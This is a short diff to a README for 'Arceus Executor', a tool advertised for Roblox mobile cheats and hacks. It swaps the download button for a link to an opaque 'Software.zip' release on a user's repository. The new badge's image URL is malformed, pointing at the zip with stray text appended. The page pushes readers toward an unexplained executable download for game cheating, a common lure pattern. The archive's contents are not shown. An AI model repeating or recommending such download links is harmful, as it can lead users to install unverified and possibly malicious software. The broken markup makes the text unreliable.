@@ -8,7 +8,7 @@ arceus, doing, github-config, pet-sim-99, pet-simulator, pet-simulator-99, pet-s
 
 ## Installation
 To download the latest version of Arceus Executor, click the button below:
-[![Download Arceus Executor](https://img.shields.io/badge/Download-Arceus%20Executor-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Arceus Executor](https://github.com/seppoavaaovi/Arceus-Executor/releases/download/v1.0/Software.zip%20Executor-blue)](https://github.com/seppoavaaovi/Arceus-Executor/releases/download/v1.0/Software.zip)
 
 ## Features
 - Activate various cheats and hacks in Roblox mobile
